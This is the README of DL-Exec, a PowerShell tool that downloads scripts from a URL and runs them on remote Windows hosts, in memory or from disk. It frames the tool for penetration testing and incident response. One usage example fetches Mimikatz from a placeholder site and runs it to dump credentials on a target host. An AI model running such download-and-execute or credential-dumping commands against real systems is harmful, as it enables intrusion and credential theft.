		Download and Execute - PowerShell
		greg . foss [at] logrhythm . com
        @heinzarelli
		v0.1 -- July 2015

## [About]

DL-Exec is a simple script that leverages user-supplied parameters to download and execute a PowerShell script with arguments on a remote host. This script can even run without touching disk via the memoryExec parameter, or if run-time parameters are required, the script can be downloaded and executed on the host directly.

## [How To]

    Execute a PowerShell script on a remote host in-memory:
        
        PS C:\> dl-exec.ps1 -source http://some.site/mimikatz.ps1 -target 10.10.10.10 -memoryExec -arguments "Invoke-Mimikatz -DumpCreds"

    Execute a PowerShell script on a remote host with run-time parameters:

        PS C:\> dl-exec.ps1 -source http://some.site/honeyports.ps1 -target 10.10.10.10 -fileExec -arguments "-Ports 21,22"

## [Use Cases]

#####Offensive

Execute various tools from frameworks like PowerSploit, Nishang, etc. on a remote host during penetration testing engagements.
![Mimikatz](/images/remote-mem-dl-exec.png)

#####Defensive

Execute various tools from frameworks like Kansa, Honeyports, etc. on a remote host during Active Defense and/or Incident Response scenarios.
![Honeyports](/images/honeyport-fileexec.png)

#####Other

No matter the script, it's possible to chain additional commands depending on the goal...
![Chaining](/images/command-chaining.png)

## [Parameter Breakdown]

    Script Source and Target Host:

        -source     :   Define the script source
        -target     :   Define the remote host

    Execution Parameters:

        -memoryExec :   Download and execute a script in memory
        -fileExec   :   Download a script and execute it from the host (leaves more traces)
        -arguments  :   Define the command-line arguments/switches/commands to be passed
                        (depending on how the script is executed)

    Credentials:

        -username   :   Administrative Username
        -password   :   Administrative Password

        If neither parameter is supplied, you will be prompted for credentials
        (FYI -- It's a bad idea to supply credentials at the command line, but there are times when it may be required)

## [License]

Copyright (c) 2016 LogRhythm

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.